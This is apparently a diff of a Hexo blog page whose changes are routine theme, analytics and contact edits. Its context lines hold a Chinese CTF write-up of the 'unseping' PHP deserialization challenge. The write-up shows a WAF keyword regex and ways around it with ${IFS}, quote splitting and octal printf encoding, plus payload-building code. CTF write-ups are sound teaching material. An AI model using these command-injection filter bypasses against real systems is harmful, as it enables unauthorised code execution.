@@ -21,10 +21,20 @@ class ease{
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
     <meta name="mobile-web-app-capable" content="yes">
     <meta name="format-detection" content="telephone=no">
+    <meta name="referrer" content="no-referrer-when-downgrade">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
     <meta name="referrer" content="no-referrer-when-downgrade">
     <!-- Global site tag (gtag.js) - Google Analytics -->
+
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-BYTY196ENH"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+    
+      gtag('config', 'G-BYTY196ENH');
+    </script>
 
 
     <title>攻防世界-unseping | hybcx&#39;s blog</title>
@@ -270,7 +280,7 @@ class ease{
         
         <li><div class="divider"></div></li>
         <li>
-            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
+            <a href="https://github.com/hybchenxing/" class="waves-effect waves-light" target="_blank">
                 <i class="fab fa-github-square fa-fw"></i>Fork Me
             </a>
         </li>
@@ -327,7 +337,7 @@ class ease{
     }
 </style>
 
-<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+<a href="https://github.com/hybchenxing/" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
    data-tooltip="Fork Me" data-position="left" data-delay="50">
     <svg viewBox="0 0 250 250" aria-hidden="true">
         <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
@@ -422,11 +432,6 @@ class ease{
                 
 
                 
-                    <div id="busuanzi_container_page_pv" class="info-break-policy">
-                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
-                        <span id="busuanzi_value_page_pv"></span>
-                    </div>
-				
             </div>
         </div>
         <hr class="clearfix">
@@ -487,10 +492,10 @@ class ease{
 @<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$ctf</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>找到敏感函数exec，查看一下用法</p>
-<p><img src="/2023/08/06/unseping/image-20230806121743382.png" alt="image-20230806121743382"></p>
+<p><img src="image-20230806121743382.png" alt="image-20230806121743382"></p>
 <p>也就是说该函数执行第一个参数的命令后，将内容填充到第二个参数，这样与var_dump配合，将成功输出命令执行后的内容。</p>
 <p>接着又看到call_user_func_array函数，看一下用法</p>
-<p><img src="/2023/08/06/unseping/image-20230806121852038.png" alt="image-20230806121852038"></p>
+<p><img src="image-20230806121852038.png" alt="image-20230806121852038"></p>
 <p>意思是该函数会把第一个参数当做一个函数调用，并传入第二个参数作为该<strong>调用函数</strong>的参数，且第二个参数还得是数组，那很明显我们需要让method=ping来调用ping函数，args就作为函数参数来传入，不出所料就要赋值为ls，cat等等，紧接着看到__wakeup方法，对args数组的内容通过foreach循环做了waf处理，那我们看一下waf函数</p>
 <pre class="line-numbers language-none"><code class="language-none">preg_match_all("/(\||&amp;|;| |\/|cat|flag|tac|php|ls)/")<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>也就是过滤了<code>|</code>, <code>&amp;</code>, <code>;</code>, 空格 ``, <code>/</code>以及<code>cat</code>, <code>flag</code>, <code>tac</code>, <code>php</code>, <code>ls</code>字符</p>
@@ -526,16 +531,16 @@ class ease{
 <span class="token keyword">echo</span><span class="token string single-quoted-string">'&lt;/br&gt;'</span><span class="token punctuation">;</span>
 <span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="/2023/08/06/unseping/image-20230806122525378.png" alt="image-20230806122525378"></p>
+<p><img src="image-20230806122525378.png" alt="image-20230806122525378"></p>
 <p>这里发现flag所在地，当时试了半天一直cat出不来，以为是哪里出问题，看了wp才知道，这里是一个文件夹。。。。。</p>
 <p>那我们继续用ls，读取看看</p>
 <p>将上述改为array(‘l\s${IFS}f""lag_1s_here’)</p>
-<p><img src="/2023/08/06/unseping/image-20230806122826210.png" alt="image-20230806122826210"></p>
+<p><img src="image-20230806122826210.png" alt="image-20230806122826210"></p>
 <p>发现flag所在地，这里也有一个疑问，当时我array()里面用的双引号包裹，然后flag之前用单引号隔开，缺一直行不通，不清楚啥原因，或许是格式吗？</p>
 <p>随后令其等于array(‘ca""t flag_1s_here/flag_831b69012c67b35f.php’)，但很明显/被过滤了，这里也不知道如何处理，参考wp发现可以用oct命令</p>
 <h3 id="oct-绕过命令执行">oct 绕过命令执行</h3>
 <p><code>$(printf "\154\163")</code>//ls命令，这个编码后可以拼接</p>
-<p><img src="/2023/08/06/unseping/image-20230806123252378.png" alt="image-20230806123252378"></p>
+<p><img src="image-20230806123252378.png" alt="image-20230806123252378"></p>
 <p>需注意，符号都为英文状态下<br>
 此时我们需要执行命令为cat flag_1s_here/flag_831b69012c67b35f.php<br>
 $(printf “cat flag_1s_here/flag_831b69012c67b35f.php”)<br>
@@ -554,7 +559,7 @@ sym <span class="token operator">=</span> <span class="token string">"\\"</span>
 <span class="token operator">//</span>将所有的八进制组合，最终的结果第一个地方应该再添加一个\
 ccc<span class="token operator">=</span>sym<span class="token punctuation">.</span>join<span class="token punctuation">(</span>arr<span class="token punctuation">)</span>
 <span class="token keyword">print</span><span class="token punctuation">(</span>ccc<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="/2023/08/06/unseping/image-20230806123425792.png" alt="image-20230806123425792"></p>
+<p><img src="image-20230806123425792.png" alt="image-20230806123425792"></p>
 <p>获取到编码后直接用poc获得payload,空格运用${IFS}绕过即可</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 
@@ -573,7 +578,7 @@ ccc<span class="token operator">=</span>sym<span class="token punctuation">.</sp
 <span class="token keyword">echo</span><span class="token string single-quoted-string">'&lt;/br&gt;'</span><span class="token punctuation">;</span>
 <span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="/2023/08/06/unseping/image-20230806123527304.png" alt="image-20230806123527304"></p>
+<p><img src="image-20230806123527304.png" alt="image-20230806123527304"></p>
 <h2 id="参考文章：">参考文章：</h2>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/yuanxu8877/article/details/127417902?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169129476416800225536756%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169129476416800225536756&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-2-127417902-null-null.142%5Ev92%5EchatgptT0_1&amp;utm_term=%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cunseping&amp;spm=1018.2226.3001.4187">参考wp</a></p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_51213906/article/details/123010661?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169129268516800226514315%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169129268516800226514315&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-123010661-null-null.142%5Ev92%5EchatgptT0_1&amp;utm_term=PHP%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87&amp;spm=1018.2226.3001.4187">RCE绕过姿势参考</a></p>
@@ -667,7 +672,7 @@ ccc<span class="token operator">=</span>sym<span class="token punctuation">.</sp
     <div id="rewardModal" class="modal">
         <div class="modal-content">
             <a class="close modal-close"><i class="fas fa-times"></i></a>
-            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <h4 class="reward-title">随缘，看各位佬的心情</h4>
             <div class="reward-content">
                 <div class="reward-tabs">
                     <ul class="tabs row">
@@ -675,7 +680,7 @@ ccc<span class="token operator">=</span>sym<span class="token punctuation">.</sp
                         <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
                     </ul>
                     <div id="alipay">
-                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                        <img src="/medias/reward/alipay.png" class="reward-img" alt="支付宝打赏二维码">
                     </div>
                     <div id="wechat">
                         <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
@@ -955,12 +960,12 @@ ccc<span class="token operator">=</span>sym<span class="token punctuation">.</sp
 <script>
     new Valine({
         el: '#vcomments',
-        appId: 'fYyLqrwhVuigWcIYcP9sPbBv-MdYXbMMI',
-        appKey: 'ht8iOzVaHwm0miBUeumGrxDF',
-        serverURLs: '',
+        appId: 'u0n6SeKEfoilg30pN4VxouXR-MdYXbMMI',
+        appKey: '36SdcVNDUm7oJBLF0OpXO4ut',
+        serverURLs: 'https://u0n6seke.api.lncldglobal.com',
         notify: 'false' === 'true',
         verify: 'false' === 'true',
-        visitor: 'true' === 'true',
+        visitor: 'false' === 'true',
         avatar: 'mm',
         pageSize: '10',
         lang: 'zh-cn',
@@ -1089,6 +1094,8 @@ ccc<span class="token operator">=</span>sym<span class="token punctuation">.</sp
 
 <!-- 代码块收缩 -->
 
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
 
 
     </div>
@@ -1116,8 +1123,8 @@ ccc<span class="token operator">=</span>sym<span class="token punctuation">.</sp
             tocSelector: '#toc-content',
             contentSelector: '#articleContent',
             headingsOffset: -($(window).height() * 0.4 - 45),
-            collapseDepth: Number('0'),
-            headingSelector: 'h2, h3, h4'
+            collapseDepth: Number('3'),
+            headingSelector: 'h2, h3, h4, h5, h6'
         });
 
         // Set scroll toc fixed.
@@ -1200,8 +1207,6 @@ ccc<span class="token operator">=</span>sym<span class="token punctuation">.</sp
             
             
             
-                
-            
             
                 <span id="busuanzi_container_site_pv">
                 &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
@@ -1221,24 +1226,28 @@ ccc<span class="token operator">=</span>sym<span class="token punctuation">.</sp
             <br>
             
         </div>
-        <div class="col s12 m4 l4 social-link social-statis">
-    <a href="https://github.com/blinkfox" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <div class="col s12 m4 l4 social-link ">
+    <a href="https://github.com/hybchenxing/" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
         <i class="fab fa-github"></i>
     </a>
 
 
 
-    <a href="mailto:1181062873@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+    <a href="mailto:2235199080@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
         <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+    <a href="https://www.facebook.com/profile.php?id=61555427038857" class="tooltipped" target="_blank" data-tooltip="关注我的Facebook: https://www.facebook.com/profile.php?id=61555427038857" data-position="top" data-delay="50">
+        <i class="fab fa-facebook-f"></i>
     </a>
 
 
 
 
 
-
-
-    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1181062873" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1181062873" data-position="top" data-delay="50">
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=2235199080" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 2235199080" data-position="top" data-delay="50">
         <i class="fab fa-qq"></i>
     </a>
 
@@ -1450,8 +1459,6 @@ $(function () {
     
     <script src="/libs/others/clicklove.js" async="async"></script>
     
-    
-    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
     
 
     
